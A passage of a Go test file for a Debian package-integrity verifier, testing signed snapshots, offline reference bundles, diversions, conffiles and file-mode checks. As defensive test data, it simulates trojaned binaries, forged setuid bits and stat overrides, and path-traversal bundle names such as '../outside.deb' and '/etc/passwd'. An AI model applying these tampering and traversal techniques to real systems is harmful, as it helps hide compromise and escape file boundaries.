
	for _, signer := range []struct {
		name   string
		key    *openpgp.Entity
		source string
	}{{"signed snapshot index", readFakeKey(t), SourceArchive}, {"snapshot file API", otherKey(t), SourceSnapshot}} {
		t.Run(signer.name, func(t *testing.T) {
			f := newFixture(t, map[string][]fakePkg{"bookworm": nil})
			for k, v := range debianSnapshot(t, signer.key, hello) {
				f.srv.set(k, v)
			}
			f.srv.set("/archive/debian/20221227T032939Z/pool/main/h/hello/hello_2.10-3_amd64.deb", hello)
			res := Verify(context.Background(), c, f.opts())
			wantPaths(t, "Verified", res.Verified, "/usr/bin/hello")
			if len(res.Verified) == 1 && res.Verified[0].Source != signer.source {
				t.Errorf("Source = %q, want %q", res.Verified[0].Source, signer.source)
			}
		})
	}
}

func TestVerifyUsesTableCache(t *testing.T) {
	f := toolFixture(t)
	cache := t.TempDir()
	opt := f.opts()
	opt.CacheDir = cache
	debURL := "/debian/" + poolName(fakePkg{"tool", "1.0-1", "amd64", nil})
	c := toolCollection(map[string]string{"/usr/bin/tool": "evil\n"})
	for i := 0; i < 2; i++ {
		res := Verify(context.Background(), c, opt)
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	}
	if n := f.srv.hitCount(debURL); n != 1 {
		t.Errorf(".deb downloaded %d times, want once (then the cached table)", n)
	}
	tables, _ := filepath.Glob(filepath.Join(cache, "debfiles-*.json"))
	if len(tables) != 1 {
		t.Fatalf("cached tables = %q", tables)
	}
	// A damaged table is not used; the .deb is fetched and checked again.
	os.WriteFile(tables[0], []byte(`{"schema":1,"files":{"../x":{}}}`), 0o600)
	res := Verify(context.Background(), c, opt)
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	if n := f.srv.hitCount(debURL); n != 2 {
		t.Errorf(".deb downloaded %d times after damaging the cache, want 2", n)
	}
}

func TestVerifyProPackage(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	c.Packages.Installed[0].Version = "1.0-1+esm1"
	res := Verify(context.Background(), c, f.opts())
	if len(res.Unverifiable) != 4 {
		t.Fatalf("Unverifiable = %+v", res.Unverifiable)
	}
	for _, v := range res.Unverifiable {
		if v.Reason != "Ubuntu Pro package: verification with a Pro token is planned" {
			t.Errorf("reason %q", v.Reason)
		}
	}
}

func TestVerifyUnsupportedRelease(t *testing.T) {
	c := toolCollection(nil)
	c.Host.OSVersionID = "10"
	res := Verify(context.Background(), c, Options{})
	if len(res.Unverifiable) != 4 || len(res.Errors) == 0 || !strings.Contains(res.Errors[0], "not supported") {
		t.Errorf("unverifiable %+v, errors %q", res.Unverifiable, res.Errors)
	}
}

func TestThirdPartyUnverifiableWithoutKey(t *testing.T) {
	third := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/thirdtool", body: "third\n", mode: 0o755}})
	pkg := model.Package{Name: "thirdtool", Version: "2.0", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/thirdtool"}}
	c := collectionOf(map[string]string{"/usr/bin/thirdtool": "third\n"}, pkg)
	f := newFixture(t, map[string][]fakePkg{"bookworm": nil})

	// The repository is signed with its own key and publishes only
	// Packages.gz, as many third-party repositories do.
	repoKey := otherKey(t)
	var gz bytes.Buffer
	zw := gzip.NewWriter(&gz)
	zw.Write([]byte(stanza("thirdtool", "2.0", "amd64", "pool/main/t/thirdtool/thirdtool_2.0_amd64.deb", third)))
	zw.Close()
	repo := newArchiveServer(t, fakeSuite(t, repoKey, recordedNow, "/repo", "bookworm", "", map[string][]byte{"main/binary-amd64/Packages.gz": gz.Bytes()}))
	repo.set("/repo/pool/main/t/thirdtool/thirdtool_2.0_amd64.deb", third)
	c.Packages.Sources = []model.AptSource{
		{File: "/etc/apt/sources.list.d/debian.sources", Types: []string{"deb"}, URIs: []string{"http://deb.debian.org/debian"}, Suites: []string{"bookworm"}, Components: []string{"main"}},
		{File: "/etc/apt/sources.list.d/example.list", Types: []string{"deb"}, URIs: []string{repo.URL + "/repo"}, Suites: []string{"bookworm"}, Components: []string{"main"}},
	}

	res := Verify(context.Background(), c, f.opts())
	wantPaths(t, "Unverifiable", res.Unverifiable, "/usr/bin/thirdtool")
	if k := res.Unverifiable[0].Kind; k != KindUntrusted {
		t.Errorf("kind %q, want %q", k, KindUntrusted)
	}
	if r := res.Unverifiable[0].Reason; r != "package not found in the official archive; source not trusted: "+repo.URL+"/repo" {
		t.Errorf("reason %q", r)
	}
	if n := repo.totalHits(); n != 0 {
		t.Errorf("contacted an untrusted source %d times", n)
	}

	// A key that does not sign the repository changes nothing.
	opt := f.opts()
	opt.ExtraKeys = fakePublicKeyring(t)
	res = Verify(context.Background(), c, opt)
	if len(res.Unverifiable) != 1 || !strings.Contains(res.Unverifiable[0].Reason, "source not trusted: "+repo.URL+"/repo") {
		t.Errorf("wrong key: Unverifiable = %+v", res.Unverifiable)
	}
	if len(res.Errors) > 0 && strings.HasPrefix(res.Errors[0], "BAD SIGNATURE") {
		t.Errorf("a third-party source signed by another key is not tampering: %q", res.Errors)
	}

	// With the repository's key, its signed index verifies the package.
	opt.ExtraKeys = publicOnly(t, repoKey)
	res = Verify(context.Background(), c, opt)
	wantPaths(t, "Verified", res.Verified, "/usr/bin/thirdtool")
	if len(res.Verified) == 1 && res.Verified[0].Source != SourceThirdParty {
		t.Errorf("Source = %q, want %q", res.Verified[0].Source, SourceThirdParty)
	}
	wantPaths(t, "Unverifiable", res.Unverifiable)
}

func writeToolBundle(t *testing.T, f *fixture, c *model.Collection) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "refs")
	if err := WriteBundle(context.Background(), c, dir, f.opts()); err != nil {
		t.Fatal(err)
	}
	return dir
}

func refsOpts(f *fixture, dir string) Options {
	opt := f.opts()
	opt.RefsDir = dir
	return opt
}

func bundleFileFor(t *testing.T, dir, suffix string) string {
	t.Helper()
	m, err := ReadBundleManifest(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, bf := range m.Files {
		if strings.HasSuffix(bf.URL, suffix) && bf.Name != "" {
			return filepath.Join(dir, bf.Name)
		}
	}
	t.Fatalf("no bundle file for %s in %+v", suffix, m.Files)
	return ""
}

func TestBundleRoundTrip(t *testing.T) {
	hello := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/hello", body: "hello 2.10\n", mode: 0o755}})
	f := toolFixture(t)
	// hello 2.10-3 is gone from the current archive; a signed snapshot has it.
	for k, v := range debianSnapshot(t, readFakeKey(t), hello) {
		f.srv.set(k, v)
	}
	f.srv.set("/archive/debian/20221227T032939Z/pool/main/h/hello/hello_2.10-3_amd64.deb", hello)
	disk := toolDisk(map[string]string{"/usr/bin/tool": "evil\n", "/usr/bin/hello": "hello 2.10\n"})
	c := collectionOf(disk, toolPackage(), model.Package{Name: "hello", Version: "2.10-3", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/hello"}})

	dir := writeToolBundle(t, f, c)
	m, err := ReadBundleManifest(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(m.Packages) != 2 || len(m.Unavailable) != 0 || m.Host.OSID != "debian" {
		t.Errorf("manifest packages %+v, unavailable %+v, host %+v", m.Packages, m.Unavailable, m.Host)
	}
	for _, bf := range m.Files {
		if bf.Name != "" && (filepath.IsAbs(bf.Name) || strings.Contains(bf.Name, "..")) {
			t.Errorf("bundle name %q", bf.Name)
		}
	}

	// The isolated machine has no network: everything comes from the bundle.
	f.srv.setDown(true)
	before := f.srv.totalHits()
	res := Verify(context.Background(), c, refsOpts(f, dir))
	if n := f.srv.totalHits() - before; n != 0 {
		t.Errorf("refs mode made %d network requests", n)
	}
	if res.Mode != ModeRefs {
		t.Errorf("Mode = %q", res.Mode)
	}
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	wantPaths(t, "Verified", res.Verified, "/usr/bin/hello", "/usr/bin/toolctl", libDir+"/libtool.so.1")
	wantPaths(t, "Unverifiable", res.Unverifiable)
	for _, v := range append(append([]FileVerdict{}, res.Mismatch...), res.Verified...) {
		if v.Source != SourceRefs {
			t.Errorf("%s: Source = %q", v.Path, v.Source)
		}
	}
	if len(res.Errors) != 0 {
		t.Errorf("Errors = %q", res.Errors)
	}

	// --full on the isolated machine asks for more than the bundle holds.
	opt := refsOpts(f, dir)
	opt.Full = true
	c.Packages.Installed = append(c.Packages.Installed, model.Package{Name: "extra", Version: "1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/extra"}})
	c.Files = append(c.Files, regular("/usr/bin/extra", "extra\n", 0o755))
	res = Verify(context.Background(), c, opt)
	if v, ok := find(res.Unverifiable, "/usr/bin/extra"); !ok || !strings.Contains(v.Reason, "reference bundle") || v.Kind != KindNotFound {
		t.Errorf("extra: %+v", res.Unverifiable)
	}
}

func TestBundleOutlivesValidUntil(t *testing.T) {
	files := fakeSuite(t, readFakeKey(t), recordedNow, "/debian", "bookworm-security", "Valid-Until: "+recordedNow.Add(7*24*time.Hour).Format(time.RFC1123)+"\n",
		map[string][]byte{"main/binary-amd64/Packages.xz": xzBytes(t, []byte(stanza("tool", "1.0-1", "amd64", poolName(fakePkg{"tool", "1.0-1", "amd64", nil}), toolDeb(t, "xz"))))})
	files["/debian/"+poolName(fakePkg{"tool", "1.0-1", "amd64", nil})] = toolDeb(t, "xz")
	srv := newArchiveServer(t, files)
	a := &Archive{BaseURL: srv.URL + "/debian", Suites: []string{"bookworm-security"}, Components: []string{"main"}, Keyring: fakePublicKeyring(t), Client: srv.Client(), Now: fixedClock(recordedNow)}
	f := &fixture{srv: srv, archives: []*Archive{a}, old: testFinder(srv, fakePublicKeyring(t), fakePublicKeyring(t))}
	c := toolCollection(nil)
	dir := writeToolBundle(t, f, c)

	// A month later the signed index has expired: the archive's other suite
	// carries a newer signed date (the machine's clock alone decides
	// nothing). The live archive is refused; the bundle, a record of what
	// was signed, is still checked.
	later := recordedNow.Add(30 * 24 * time.Hour)
	for k, v := range fakeSuite(t, readFakeKey(t), later, "/debian", "bookworm", "", map[string][]byte{"main/binary-amd64/Packages.xz": xzBytes(t, nil)}) {
		srv.set(k, v)
	}
	live := *a
	live.Suites = []string{"bookworm", "bookworm-security"}
	res := Verify(context.Background(), c, Options{Archives: []*Archive{&live}, Old: f.old, Now: fixedClock(later)})
	if len(res.Verified) != 0 || len(res.Errors) == 0 || !strings.Contains(res.Errors[0], "Valid-Until") {
		t.Errorf("live: verified %+v, errors %q", res.Verified, res.Errors)
	}
	res = Verify(context.Background(), c, refsOpts(f, dir))
	wantPaths(t, "Verified", res.Verified, "/usr/bin/tool", "/usr/bin/toolctl", libDir+"/libtool.so.1")
}

func TestBundleSignedOnly(t *testing.T) {
	// hello is only on snapshot.debian.org's SHA-1 file API, which a bundle
	// cannot carry verifiably.
	hello := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/hello", body: "hello 2.10\n", mode: 0o755}})
	f := newFixture(t, map[string][]fakePkg{"bookworm": nil})
	for k, v := range debianSnapshot(t, otherKey(t), hello) {
		f.srv.set(k, v)
	}
	c := collectionOf(map[string]string{"/usr/bin/hello": "hello 2.10\n"}, model.Package{Name: "hello", Version: "2.10-3", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/hello"}})
	dir := writeToolBundle(t, f, c)
	m, err := ReadBundleManifest(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(m.Packages) != 0 || len(m.Unavailable) != 1 || m.Unavailable[0].Name != "hello" {
		t.Errorf("packages %+v, unavailable %+v", m.Packages, m.Unavailable)
	}
	for _, bf := range m.Files {
		if strings.Contains(bf.URL, "/file/") {
			t.Errorf("bundle holds an unsigned download %s", bf.URL)
		}
	}
}

func TestBundleTamperedDebRejected(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	dir := writeToolBundle(t, f, c)
	deb := bundleFileFor(t, dir, "/tool_1.0-1_amd64.deb")
	b, err := os.ReadFile(deb)
	if err != nil {
		t.Fatal(err)
	}
	b[len(b)-10] ^= 1
	if err := os.WriteFile(deb, b, 0o600); err != nil {
		t.Fatal(err)
	}
	f.srv.setDown(true)
	res := Verify(context.Background(), c, refsOpts(f, dir))
	wantPaths(t, "Verified", res.Verified)
	wantPaths(t, "Mismatch", res.Mismatch)
	if v, ok := find(res.Unverifiable, "/usr/bin/tool"); !ok || !strings.Contains(v.Reason, "hash mismatch") {
		t.Errorf("Unverifiable = %+v", res.Unverifiable)
	}
	if len(res.Errors) == 0 || !strings.HasPrefix(res.Errors[0], "HASH MISMATCH") {
		t.Errorf("Errors = %q", res.Errors)
	}
}

func TestBundleTamperedIndexRejected(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	dir := writeToolBundle(t, f, c)
	inrel := bundleFileFor(t, dir, "/dists/bookworm-updates/InRelease")
	b, _ := os.ReadFile(inrel)
	os.WriteFile(inrel, bytes.Replace(b, []byte("Label: Fake"), []byte("Label: Fakf"), 1), 0o600)
	res := Verify(context.Background(), c, refsOpts(f, dir))
	wantPaths(t, "Verified", res.Verified)
	if len(res.Errors) == 0 || !strings.HasPrefix(res.Errors[0], "BAD SIGNATURE") {
		t.Errorf("Errors = %q", res.Errors)
	}
}

func TestBundleRejectsUnsafeNames(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)

	editManifest := func(t *testing.T, dir string, edit func(m map[string]any)) {
		t.Helper()
		p := filepath.Join(dir, "bundle.json")
		b, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		var m map[string]any
		if err := json.Unmarshal(b, &m); err != nil {
			t.Fatal(err)
		}
		edit(m)
		b, _ = json.Marshal(m)
		os.WriteFile(p, b, 0o600)
	}
	for _, bad := range []string{"../outside.deb", "/etc/passwd", "files/../../x", "files//x", ""} {
		t.Run(fmt.Sprintf("name %q", bad), func(t *testing.T) {
			dir := writeToolBundle(t, f, c)
			editManifest(t, dir, func(m map[string]any) {
				files := m["files"].([]any)
				files[0].(map[string]any)["name"] = bad
			})
			if _, err := ReadBundleManifest(dir); err == nil {
				t.Error("ReadBundleManifest accepted it")
			}
			res := Verify(context.Background(), c, refsOpts(f, dir))
			wantPaths(t, "Verified", res.Verified)
			if len(res.Unverifiable) != 4 || !strings.Contains(strings.Join(res.Errors, "\n"), "reference bundle") {
				t.Errorf("unverifiable %+v, errors %q", res.Unverifiable, res.Errors)
			}
		})
	}

	t.Run("symlink out of the bundle", func(t *testing.T) {
		dir := writeToolBundle(t, f, c)
		deb := bundleFileFor(t, dir, "/tool_1.0-1_amd64.deb")
		// Even a copy of the genuine .deb outside the bundle is not read.
		outside := filepath.Join(t.TempDir(), "tool.deb")
		b, _ := os.ReadFile(deb)
		os.WriteFile(outside, b, 0o600)
		os.Remove(deb)
		if err := os.Symlink(outside, deb); err != nil {
			t.Fatal(err)
		}
		res := Verify(context.Background(), c, refsOpts(f, dir))
		wantPaths(t, "Verified", res.Verified)
		if len(res.Unverifiable) != 4 {
			t.Errorf("Unverifiable = %+v", res.Unverifiable)
		}
	})

	t.Run("FIFO instead of a file", func(t *testing.T) {
		dir := writeToolBundle(t, f, c)
		deb := bundleFileFor(t, dir, "/tool_1.0-1_amd64.deb")
		os.Remove(deb)
		if err := syscall.Mkfifo(deb, 0o600); err != nil {
			t.Fatal(err)
		}
		done := make(chan *Result, 1)
		go func() { done <- Verify(context.Background(), c, refsOpts(f, dir)) }()
		select {
		case res := <-done:
			wantPaths(t, "Verified", res.Verified)
			if len(res.Unverifiable) != 4 {
				t.Errorf("Unverifiable = %+v", res.Unverifiable)
			}
		case <-time.After(10 * time.Second):
			t.Fatal("Verify hangs on a FIFO in the bundle")
		}
	})

	t.Run("unknown fields and trailing data", func(t *testing.T) {
		dir := writeToolBundle(t, f, c)
		editManifest(t, dir, func(m map[string]any) { m["extra"] = true })
		if _, err := ReadBundleManifest(dir); err == nil {
			t.Error("unknown field accepted")
		}
	})
}

func TestWriteBundleRefusesNonEmptyDir(t *testing.T) {
	f := toolFixture(t)
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "something"), []byte("x"), 0o600)
	if err := WriteBundle(context.Background(), toolCollection(nil), dir, f.opts()); err == nil {
		t.Fatal("wrote into a non-empty directory")
	}
}

func TestWriteBundleReportsTampering(t *testing.T) {
	f := toolFixture(t)
	f.srv.set("/debian/"+poolName(fakePkg{"tool", "1.0-1", "amd64", nil}), []byte("not the package"))
	err := WriteBundle(context.Background(), toolCollection(nil), filepath.Join(t.TempDir(), "refs"), f.opts())
	if !errors.Is(err, ErrHashMismatch) {
		t.Fatalf("err = %v, want ErrHashMismatch", err)
	}
}

func TestLoadKeys(t *testing.T) {
	dir := t.TempDir()
	var buf bytes.Buffer
	pub := publicOnly(t, otherKey(t))
	if err := pub[0].Serialize(&buf); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(dir, "repo.gpg"), buf.Bytes(), 0o644)
	kr, err := LoadKeys(dir)
	if err != nil || len(kr) != 1 {
		t.Fatalf("LoadKeys = %v, %v", kr, err)
	}
	os.WriteFile(filepath.Join(dir, "junk.asc"), []byte("not a key"), 0o644)
	if _, err := LoadKeys(dir); err == nil {
		t.Error("accepted a file that holds no key")
	}
}

// withFile returns c with the collected entry for path replaced by e (or
// added).
func withFile(c *model.Collection, e model.FileEntry) *model.Collection {
	for i := range c.Files {
		if c.Files[i].Path == e.Path {
			c.Files[i] = e
			return c
		}
	}
	c.Files = append(c.Files, e)
	return c
}

func symlinkEntry(path, target string) model.FileEntry {
	return model.FileEntry{Path: path, Type: "symlink", Target: target, Mode: 0o120777}
}

func TestVerifyConffileReplacedBySymlink(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(nil)
	withFile(c, symlinkEntry("/etc/tool.conf", "/tmp/.x/conf"))
	withFile(c, symlinkEntry("/etc/init.d/tool", "/tmp/.x/init"))
	opt := f.opts()
	opt.OnlyPaths = map[string]bool{"/etc/tool.conf": true, "/etc/init.d/tool": true}
	res := Verify(context.Background(), c, opt)
	wantPaths(t, "Mismatch", res.Mismatch)
	if len(res.Conffiles) != 2 {
		t.Fatalf("Conffiles = %+v", res.Conffiles)
	}
	for _, d := range res.Conffiles {
		if !strings.HasPrefix(d.Actual, "symlink to /tmp/.x/") || d.Package != "tool" || d.Expected == "" {
			t.Errorf("diff %+v", d)
		}
	}
}

func TestVerifyObsoleteConffile(t *testing.T) {
	f := toolFixture(t)
	pkg := toolPackage()
	// Still on disk and in dpkg's lists from an older version; the current
	// package no longer ships them.
	pkg.Files = append(pkg.Files, "/etc/tool.d/old.sh", "/usr/lib/tool/old.sh")
	pkg.ObsoleteConffiles = []string{"/etc/tool.d/old.sh", "/usr/lib/tool/old.sh"}
	c := collectionOf(toolDisk(map[string]string{"/etc/tool.d/old.sh": "#!/bin/sh\n", "/usr/lib/tool/old.sh": "#!/bin/sh\n"}), pkg)
	res := Verify(context.Background(), c, f.opts())
	if len(res.Conffiles) != 1 || res.Conffiles[0].Path != "/etc/tool.d/old.sh" || res.Conffiles[0].Note != "obsolete conffile (no longer shipped by the package)" || res.Conffiles[0].Package != "tool" {
		t.Errorf("Conffiles = %+v", res.Conffiles)
	}
	// Outside /etc the claim is not taken: the signed package lacks it.
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/lib/tool/old.sh")
}

func TestVerifyFileListsDoNotDecide(t *testing.T) {
	f := toolFixture(t)
	t.Run("trojan moved to a fake package's list", func(t *testing.T) {
		pkg := toolPackage()
		pkg.Files = slices.DeleteFunc(pkg.Files, func(s string) bool { return s == "/usr/bin/tool" })
		helper := model.Package{Name: "aaa-helper", Version: "1.0", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/tool"}}
		c := collectionOf(toolDisk(map[string]string{"/usr/bin/tool": "evil\n"}), helper, pkg)
		res := Verify(context.Background(), c, f.opts())
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
		if m, _ := find(res.Mismatch, "/usr/bin/tool"); m.Package != "tool" || m.Expected != sha256hex([]byte(toolBin)) {
			t.Errorf("mismatch %+v, want tool's file as expected", m)
		}
		if _, ok := find(res.Unverifiable, "/usr/bin/tool"); ok {
			t.Error("the trojan is also listed as unverifiable")
		}
	})
	t.Run("file list trimmed to the README", func(t *testing.T) {
		pkg := toolPackage()
		pkg.Files = []string{"/usr/share/doc/tool/README"}
		c := collectionOf(toolDisk(map[string]string{"/usr/bin/tool": "evil\n"}), pkg)
		res := Verify(context.Background(), c, f.opts())
		wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
		wantPaths(t, "Verified", res.Verified, "/usr/bin/toolctl", libDir+"/libtool.so.1")
	})
}

const (
	manBin    = "\x7fELF man-db man\n"
	manScript = "#!/bin/sh\necho 'This system has been minimized'\n"
)

func manFixture(t *testing.T, patchShipsScript bool) *fixture {
	t.Helper()
	mandb := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/man", body: manBin, mode: 0o755}})
	var patch []debEntry
	if patchShipsScript {
		patch = append(patch, debEntry{name: "./usr/bin/man", body: manScript, mode: 0o755})
	}
	patch = append(patch, debEntry{name: "./usr/share/doc/manpatch/README", body: "x", mode: 0o644})
	return newFixture(t, map[string][]fakePkg{"bookworm": {
		{"man-db", "2.11-1", "amd64", mandb},
		{"manpatch", "1", "all", buildDeb(t, "xz", nil, patch)},
	}})
}

func manCollection(div model.Diversion) *model.Collection {
	c := collectionOf(map[string]string{"/usr/bin/man": manScript, "/usr/bin/man.REAL": manBin},
		model.Package{Name: "man-db", Version: "2.11-1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/man"}},
		model.Package{Name: "manpatch", Version: "1", Arch: "all", Status: "install ok installed", Files: []string{"/usr/bin/man", "/usr/share/doc/manpatch/README"}},
	)
	c.Packages.Diversions = []model.Diversion{div}
	return c
}

func TestVerifyDiversions(t *testing.T) {
	t.Run("package diversion", func(t *testing.T) {
		// manpatch diverts man-db's /usr/bin/man to /usr/bin/man.REAL and
		// ships its own /usr/bin/man.
		f := manFixture(t, true)
		res := Verify(context.Background(), manCollection(model.Diversion{Path: "/usr/bin/man", DivertTo: "/usr/bin/man.REAL", Package: "manpatch"}), f.opts())
		wantPaths(t, "Mismatch", res.Mismatch)
		wantPaths(t, "Verified", res.Verified, "/usr/bin/man", "/usr/bin/man.REAL")
		if v, _ := find(res.Verified, "/usr/bin/man"); v.Package != "manpatch" {
			t.Errorf("/usr/bin/man verified as %+v", v)
		}
		if v, _ := find(res.Verified, "/usr/bin/man.REAL"); v.Package != "man-db" {
			t.Errorf("/usr/bin/man.REAL verified as %+v", v)
		}
	})
	t.Run("package diversion, diverting package ships no file there", func(t *testing.T) {
		// Only the machine's own data explains the file: suspicious.
		f := manFixture(t, false)
		res := Verify(context.Background(), manCollection(model.Diversion{Path: "/usr/bin/man", DivertTo: "/usr/bin/man.REAL", Package: "manpatch"}), f.opts())
		wantPaths(t, "Mismatch", res.Mismatch)
		wantPaths(t, "Unverifiable", res.Unverifiable)
		wantPaths(t, "Verified", res.Verified, "/usr/bin/man.REAL")
		if v, ok := find(res.Suspicious, "/usr/bin/man"); !ok || v.Reason != "diverted by manpatch, which does not ship this file" || v.Package != "manpatch" || v.Kind != KindDiversion {
			t.Errorf("Suspicious = %+v", res.Suspicious)
		}
	})
	t.Run("forged diversion by a package that is not installed", func(t *testing.T) {
		f := toolFixture(t)
		c := toolCollection(map[string]string{"/usr/bin/tool": "evil\n"})
		c.Packages.Diversions = []model.Diversion{{Path: "/usr/bin/tool", DivertTo: "/usr/bin/tool.distrib", Package: "ghost"}}
		res := Verify(context.Background(), c, f.opts())
		wantPaths(t, "Unverifiable", res.Unverifiable)
		if v, ok := find(res.Suspicious, "/usr/bin/tool"); !ok || v.Reason != "diverted by ghost, which is not installed" || v.Kind != KindDiversion {
			t.Errorf("Suspicious = %+v", res.Suspicious)
		}
	})
	t.Run("local diversion, as Ubuntu's minimised images make", func(t *testing.T) {
		f := manFixture(t, true)
		res := Verify(context.Background(), manCollection(model.Diversion{Path: "/usr/bin/man", DivertTo: "/usr/bin/man.REAL", Package: ":"}), f.opts())
		wantPaths(t, "Mismatch", res.Mismatch)
		wantPaths(t, "Verified", res.Verified, "/usr/bin/man.REAL")
		if v, ok := find(res.Unverifiable, "/usr/bin/man"); !ok || v.Reason != "locally diverted (dpkg-divert)" {
			t.Errorf("Unverifiable = %+v", res.Unverifiable)
		}
	})
}

// cronPostinst is how Debian's cron makes crontab setgid.
const cronPostinst = "#!/bin/sh\nset -e\ndpkg-statoverride --update --add root crontab 2755 /usr/bin/crontab\n"

func TestVerifyFileModes(t *testing.T) {
	crontab := buildDebScript(t, "xz", nil, cronPostinst, []debEntry{{name: "./usr/bin/crontab", body: "crontab\n", mode: 0o755}})
	passwd := buildDeb(t, "xz", nil, []debEntry{
		{name: "./usr/bin/chfn", body: "chfn\n", mode: 0o4755},
		{name: "./usr/lib/x86_64-linux-gnu/libpw.so.1", body: "pw\n", mode: 0o644},
	})
	f := newFixture(t, map[string][]fakePkg{"bookworm": {{"cron", "3.0", "amd64", crontab}, {"passwd", "1", "amd64", passwd}, {"tool", "1.0-1", "amd64", toolDeb(t, "xz")}}})
	c := collectionOf(toolDisk(map[string]string{"/usr/bin/crontab": "crontab\n"}), toolPackage(),
		model.Package{Name: "cron", Version: "3.0", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/crontab"}},
		model.Package{Name: "passwd", Version: "1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/chfn", libDir + "/libpw.so.1"}})
	// cron's signed maintainer script makes crontab setgid through
	// dpkg-statoverride.
	withFile(c, model.FileEntry{Path: "/usr/bin/crontab", Type: "file", SHA256: sha256hex([]byte("crontab\n")), Mode: 0o102755})
	c.Packages.StatOverrides = []model.StatOverride{{Path: "/usr/bin/crontab", Owner: "root", Group: "crontab", Mode: 0o2755}}
	// Someone made tool setuid root: added privilege.
	withFile(c, model.FileEntry{Path: "/usr/bin/tool", Type: "file", SHA256: sha256hex([]byte(toolBin)), Mode: 0o104755})
	// Someone made a library writable by everyone: added privilege.
	withFile(c, model.FileEntry{Path: libDir + "/libpw.so.1", Type: "file", SHA256: sha256hex([]byte("pw\n")), Mode: 0o100646})
	// Hardening that removes bits is noted, not a mismatch.
	withFile(c, model.FileEntry{Path: "/usr/bin/chfn", Type: "file", SHA256: sha256hex([]byte("chfn\n")), Mode: 0o100755})
	withFile(c, model.FileEntry{Path: libDir + "/libtool.so.1", Type: "file", SHA256: sha256hex([]byte(toolLib)), Mode: 0o100640})

	res := Verify(context.Background(), c, f.opts())
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool", libDir+"/libpw.so.1")
	if m, _ := find(res.Mismatch, "/usr/bin/tool"); m.Reason != "mode differs: deb 0755, disk 4755" || m.Kind != KindModeAddsPrivilege {
		t.Errorf("mismatch %+v", m)
	}
	if m, _ := find(res.Mismatch, libDir+"/libpw.so.1"); m.Reason != "mode differs: deb 0644, disk 0646" {
		t.Errorf("mismatch %+v", m)
	}
	wantPaths(t, "Verified", res.Verified, "/usr/bin/chfn", "/usr/bin/crontab", "/usr/bin/toolctl", libDir+"/libtool.so.1")
	for p, want := range map[string]string{
		"/usr/bin/chfn":          "mode differs (less permissive): deb 4755, disk 0755",
		libDir + "/libtool.so.1": "mode differs (less permissive): deb 0644, disk 0640",
		"/usr/bin/crontab":       "",
		"/usr/bin/toolctl":       "",
	} {
		wantKind := ""
		if want != "" {
			wantKind = KindModeLessPermissive
		}
		if v, _ := find(res.Verified, p); v.Reason != want || v.Kind != wantKind {
			t.Errorf("%s: verified with reason %q kind %q, want %q", p, v.Reason, v.Kind, want)
		}
	}

	// Without the override the setgid bit is unexplained.
	c.Packages.StatOverrides = nil
	res = Verify(context.Background(), c, f.opts())
	if m, ok := find(res.Mismatch, "/usr/bin/crontab"); !ok || m.Reason != "mode differs: deb 0755, disk 2755" {
		t.Errorf("Mismatch = %+v", res.Mismatch)
	}
}

func TestVerifyStatOverrideForgery(t *testing.T) {
	passwd := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/chfn", body: "chfn\n", mode: 0o4755}})
	crontab := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/crontab", body: "crontab\n", mode: 0o755}}) // no maintainer script
	f := newFixture(t, map[string][]fakePkg{"bookworm": {{"cron", "3.0", "amd64", crontab}, {"passwd", "1", "amd64", passwd}, {"tool", "1.0-1", "amd64", toolDeb(t, "xz")}}})
	c := collectionOf(toolDisk(map[string]string{"/usr/bin/crontab": "crontab\n", "/usr/bin/chfn": "chfn\n"}), toolPackage(),
		model.Package{Name: "cron", Version: "3.0", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/crontab"}},
		model.Package{Name: "passwd", Version: "1", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/chfn"}})
	mode := func(p, body string, m uint32) {
		withFile(c, model.FileEntry{Path: p, Type: "file", SHA256: sha256hex([]byte(body)), Mode: 0o100000 | m})
	}
	mode("/usr/bin/tool", toolBin, 0o4755)
	mode(libDir+"/libtool.so.1", toolLib, 0o666)
	mode("/usr/bin/crontab", "crontab\n", 0o2755)
	mode("/usr/bin/chfn", "chfn\n", 0o755)
	// Root can write statoverride entries that explain any mode.
	c.Packages.StatOverrides = []model.StatOverride{
		{Path: "/usr/bin/tool", Owner: "root", Group: "root", Mode: 0o4755},
		{Path: libDir + "/libtool.so.1", Owner: "root", Group: "root", Mode: 0o666},
		{Path: "/usr/bin/crontab", Owner: "root", Group: "crontab", Mode: 0o2755},
		// Removing privilege with a statoverride is fine.
		{Path: "/usr/bin/chfn", Owner: "root", Group: "root", Mode: 0o755},
	}
	res := Verify(context.Background(), c, f.opts())
